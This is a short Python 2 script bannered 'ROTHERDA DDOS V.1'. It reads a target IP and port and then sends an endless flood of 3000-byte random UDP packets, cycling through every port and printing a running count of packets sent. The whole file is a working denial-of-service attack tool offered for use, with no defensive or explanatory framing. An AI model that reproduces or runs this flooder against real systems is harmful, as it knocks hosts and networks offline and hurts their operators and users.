#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3000)
os.system("clear")
banner = """
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     ROTHERDA DDOS V.1

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
print(banner)
ip = raw_input("Target Ip => ")
port = input("Target Port => ")
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("------------------------------------------------------------------------------------")
     print(" Sended Packets => %s \n Ip Address =>  %s \n Connection => :%s"%(sent,ip,port))
     print("------------------------------------------------------------------------------------")
     if port == 65534:
        port = 1
